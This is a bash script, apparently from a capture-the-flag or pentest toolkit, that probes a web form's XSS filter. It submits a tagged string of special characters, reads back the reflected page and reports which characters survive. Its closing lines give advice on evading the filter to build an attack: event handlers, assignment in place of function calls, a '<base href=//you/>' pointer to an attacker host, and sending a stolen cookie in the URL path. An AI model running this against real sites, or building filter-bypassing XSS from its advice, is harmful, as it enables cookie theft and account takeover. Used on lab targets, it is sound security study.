#!/usr/bin/env bash
# xss-filter-probe — find out which characters a stored/reflected field strips or encodes.
# This is step 0 of exploiting a filtered XSS: you can't pick a payload until you know
# what survives. Submits a labelled probe, reads it back, and reports per-character.
#
# Usage:
#   ./xss-filter-probe.sh <submit-url> <field> <view-url> [GET|POST] [cookie]
#
# Example (jubula-style stored guestbook):
#   ./xss-filter-probe.sh http://t/status-check.php guestPost http://t/status-check.php POST
#
# submit-url/field : where the input goes.  view-url : where it's reflected/stored-rendered.
set -uo pipefail
SUB="${1:?usage: xss-filter-probe.sh <submit-url> <field> <view-url> [GET|POST] [cookie]}"
FIELD="${2:?need the input field name}"
VIEW="${3:?need the reflection/view url}"
METHOD="${4:-POST}"
COOKIE="${5:-}"
CK=(); [ -n "$COOKIE" ] && CK=(-b "$COOKIE")

# each test char flanked by its own uppercase tag so we can tell exactly what survived
declare -A T=(
  [LP]='(' [RP]=')' [QM]='?' [PL]='+' [BT]='`' [DL]='$' [LB]='{' [RB]='}'
  [LK]='[' [RK]=']' [SC]=';' [AMP]='&' [PI]='|' [ST]='*' [BG]='!' [EQ]='='
  [CO]=':' [SL]='/' [DT]='.' [DQ]='"' [SQ]="'" [LT]='<' [GT]='>' [CM]=',' [BS]='\' [SP]=' '
)
ORDER=(LP RP QM PL BT DL LB RB LK RK SC AMP PI ST BG EQ CO SL DT DQ SQ LT GT CM BS SP)
PROBE="XPROBESTART"
for k in "${ORDER[@]}"; do PROBE+="z${k}z${T[$k]}"; done
PROBE+="zXPROBEEND"

# submit
if [ "$METHOD" = GET ]; then curl -s "${CK[@]}" --max-time 15 -G "$SUB" --data-urlencode "$FIELD=$PROBE" -o /dev/null
else curl -s "${CK[@]}" --max-time 15 "$SUB" --data-urlencode "$FIELD=$PROBE" -o /dev/null; fi

# read back the reflected probe region
resp=$(curl -s "${CK[@]}" --max-time 15 "$VIEW")
seg=$(printf '%s' "$resp" | grep -aoE 'XPROBESTART.*XPROBEEND' | tail -1)
[ -z "$seg" ] && { echo "[!] probe not reflected at $VIEW — wrong view url, or input not stored/reflected. Raw check for 'XPROBESTART' failed."; exit 0; }

echo "[*] stripped / kept (as seen in the reflection):"
stripped=""; kept=""
for k in "${ORDER[@]}"; do
  c="${T[$k]}"
  # the char should appear right after the 'z<k>z' marker in the segment
  after=$(printf '%s' "$seg" | grep -aoE "z${k}z." | head -1 | sed -E "s/^z${k}z//")
  if [ "$after" = "$c" ]; then kept+="$c "; else stripped+="$c "; fi
done
echo "    KEPT    : $kept"
echo "    STRIPPED: $stripped"
echo
echo "[*] pick your technique from what's KEPT (see scripts/payloads/xss-filtered.md):"
echo "    no ( )      -> no function calls: use assignment (location=, .src=, .innerHTML=) + event handlers, not fetch()/alert()"
echo "    no +  \` \${} -> no string concat: use <base href=//you/> and a RELATIVE url so you never concatenate"
echo "    no ?        -> put data in the URL PATH not the query (cookie-as-path)"
echo "    no < >      -> you're in an existing tag: break out via an attribute/event handler instead of a new tag"
echo "    no \" '      -> use unquoted attributes, or String.fromCharCode-free tricks"
